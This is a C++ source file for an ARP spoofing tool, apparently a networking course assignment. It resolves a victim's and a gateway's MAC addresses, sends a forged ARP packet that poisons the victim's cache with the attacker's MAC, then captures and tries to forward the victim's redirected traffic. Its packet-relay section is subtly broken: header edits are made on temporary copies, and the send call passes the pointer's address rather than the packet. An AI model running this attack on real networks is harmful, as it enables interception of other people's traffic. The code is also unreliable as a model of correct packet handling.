#include <pcap.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <ifaddrs.h>
#include <stdio.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "pcap_hdr.h"


using namespace std;


void print_mac(u_int8_t *m){
	printf("%02x:%02x:%02x:%02x:%02x:%02x", m[0],m[1],m[2],m[3],m[4],m[5]);
}

void print_ip(struct in_addr *m) {
    printf("%s", inet_ntoa(*m));
}

void print_port(u_int16_t m){
	printf("%d", htons(m));
}

std::string getMacAddress(const std::string& interfaceName) {
    std::ifstream file("/sys/class/net/" + interfaceName + "/address");
    if (!file) {
        std::cerr << "Failed to open file: /sys/class/net/" << interfaceName << "/address" << std::endl;
        return "";
    }

    std::stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

std::string getIpAddress(const std::string& interfaceName) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, interfaceName.c_str(), IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);

    return inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr);
}

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]){
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    string interfaceName = argv[1];
    string macAddress = getMacAddress(interfaceName);
    string ipAddress = getIpAddress(interfaceName);

    cout << "MAC Address: " << macAddress << endl;
    cout << "IP Address: " << ipAddress << endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    for (int i = 2; i < argc - 1; i += 2) { 

        EthArpPacket packet_send;
        EthArpPacket packet_tar;

        //sender's arp request

        packet_send.eth_.smac_ = Mac(macAddress);//ME
        packet_send.eth_.dmac_ = Mac(Mac::broadcastMac());//BORADCAST
        packet_send.eth_.type_ = htons(EthHdr::Arp);

        packet_send.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet_send.arp_.pro_ = htons(EthHdr::Ip4);
        packet_send.arp_.hln_ = Mac::SIZE;
        packet_send.arp_.pln_ = Ip::SIZE;
        packet_send.arp_.op_ = htons(ArpHdr::Request);
        packet_send.arp_.smac_ = Mac(macAddress);//MY MAC
        packet_send.arp_.sip_ = htonl(Ip(ipAddress));//MY IP
        packet_send.arp_.tmac_ = Mac("00:00:00:00:00:00");//WHAT IS THE MAC?
        packet_send.arp_.tip_ = htonl(Ip(argv[i]));//YOUR IP
        struct Mac mac_send;
        

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        
        //sender's arp reply

        struct pcap_pkthdr* header1;
        const u_char* reply_packet1;

        EthArpPacket* reply1 = nullptr;


        while (true) {
            int ret = pcap_next_ex(handle, &header1, &reply_packet1);
            if (ret == 0) {
                printf("Timeout, no packet received\n");
                continue;
            }
            if (ret == -1 || ret == -2) {
                // Error or EOF, break the loop
                fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
                break;
            }

            // 해석된 패킷을 출력합니다.

            reply1 = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(reply_packet1));
            if (reply1->eth_.type_ == htons(EthHdr::Arp) &&
                reply1->arp_.op_ == htons(ArpHdr::Reply) &&
                reply1->arp_.sip_ == packet_send.arp_.tip_) {
                printf("victim : Received ARP reply from %s with MAC address: %s\n",
                static_cast<std::string>(reply1->arp_.sip_).c_str(),
                static_cast<std::string>(reply1->arp_.smac_).c_str());
                mac_send = reply1->arp_.smac_;
                break;
                }
            else {
                printf("Not the ARP reply\n");
            }
        }

        //gateway's arp Request
        packet_tar.eth_.smac_ = Mac(macAddress);
        packet_tar.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//BORADCAST
        packet_tar.eth_.type_ = htons(EthHdr::Arp);

        packet_tar.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet_tar.arp_.pro_ = htons(EthHdr::Ip4);
        packet_tar.arp_.hln_ = Mac::SIZE;
        packet_tar.arp_.pln_ = Ip::SIZE;
        packet_tar.arp_.op_ = htons(ArpHdr::Request);
        packet_tar.arp_.smac_ = Mac(macAddress); //MY MAC
        packet_tar.arp_.sip_ = htonl(Ip(ipAddress)); //MY IP
        packet_tar.arp_.tmac_ = Mac("00:00:00:00:00:00"); //WHAT IS THE MAC?
        packet_tar.arp_.tip_ = htonl(Ip(argv[i + 1])); //YOUR IP
        struct Mac mac_tar;
        
        
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_tar), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }


        //gateway's arp reply

        struct pcap_pkthdr* header2;
        const u_char* reply_packet2;

        EthArpPacket* reply2 = nullptr;

        while (true) {
            int ret = pcap_next_ex(handle, &header2, &reply_packet2);
            if (ret == 0) {
                printf("Timeout, no packet received\n");
                continue;
            }
            if (ret == -1 || ret == -2) {
                // Error or EOF, break the loop 
                fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
                break;
            }

            reply2 = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(reply_packet2));
            if (reply2->eth_.type_ == htons(EthHdr::Arp) &&
                reply2->arp_.op_ == htons(ArpHdr::Reply) &&
                reply2->arp_.sip_ == packet_tar.arp_.tip_) {
                printf("gateway : Received ARP reply from %s with MAC address: %s\n",
                    static_cast<std::string>(reply2->arp_.sip_).c_str(),
                    static_cast<std::string>(reply2->arp_.smac_).c_str());
                    mac_tar = reply2->arp_.smac_;
                break; 
            }
            else {
                printf("Not the ARP reply\n");
            }
        }


        //faked packet
        EthArpPacket fpacket1;

        fpacket1.eth_.smac_ = Mac(macAddress);//ME
        fpacket1.eth_.dmac_ = mac_send;
        fpacket1.eth_.type_ = htons(EthHdr::Arp);

        fpacket1.arp_.hrd_ = htons(ArpHdr::ETHER);
        fpacket1.arp_.pro_ = htons(EthHdr::Ip4);
        fpacket1.arp_.hln_ = Mac::SIZE;
        fpacket1.arp_.pln_ = Ip::SIZE;
        fpacket1.arp_.op_ = htons(ArpHdr::Request);
        fpacket1.arp_.smac_ = Mac(macAddress);//MY MAC
        fpacket1.arp_.sip_ = htonl(Ip(argv[i + 1]));//gateway ip
        fpacket1.arp_.tmac_ =mac_send; //WHAT IS THE MAC?
        fpacket1.arp_.tip_ = htonl(Ip(argv[i]));//YOUR IP


        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fpacket1), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        
        //우회된 패킷 받기, 추가코드 start
        struct pcap_pkthdr* header3;
        const u_char* reply_packet3;

        while (true) {
            int ret = pcap_next_ex(handle, &header3, &reply_packet3);
            if (ret == 0) {
                printf("Timeout, no packet received\n");
                continue;
            }
            if (ret == -1 || ret == -2) {
                // Error or EOF, break the loop
                fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
                break;
            }

            // 패킷을 출력합니다.

            printf(" %u bytes captured \n", header3->caplen);//packet's length
		
		    struct EthHdr* lay2_eth_hdr = (struct EthHdr*)reply_packet3;
            struct ArpHdr* lay2_arp_hdr = (struct ArpHdr*)reply_packet3 + sizeof(struct EthHdr);
        	struct libnet_ethernet_hdr*  eth_hdr = (struct libnet_ethernet_hdr *)(reply_packet3);
            struct libnet_ipv4_hdr* ip4_hdr = (struct libnet_ipv4_hdr *)(reply_packet3 + sizeof(struct libnet_ethernet_hdr));

            if (lay2_eth_hdr->type_ == htons(EthHdr::Arp)){
                printf("this is arp packet\n");
                continue;
            }
                
            printf("checking point!================");
            print_ip(&(ip4_hdr->ip_src));
            printf(", ");
            print_ip(&(ip4_hdr->ip_dst));
            printf("\n");
            printf("현재 캡처 MAC:  %s and %s, sender's MAC: %s, gateway's MAC: %s\n",
                    static_cast<std::string>(Mac(eth_hdr->ether_shost)).c_str(),
                    static_cast<std::string>(Mac(eth_hdr->ether_dhost)).c_str(),
                    static_cast<std::string>(mac_send).c_str(),
                    static_cast<std::string>(mac_tar).c_str()
                    );


            if (Mac(eth_hdr->ether_shost) == mac_send && Ip(ip4_hdr->ip_dst.s_addr) == Ip(argv[i+1])){
                printf("packet send!\n");
                //mac address modify

                Mac(eth_hdr->ether_dhost) = mac_tar;
                Mac(eth_hdr->ether_shost) = macAddress;

                //send packet
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reply_packet3), header3->caplen);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
            }
            else
                continue;
     
        }
    }

    pcap_close(handle);

    return 0;
}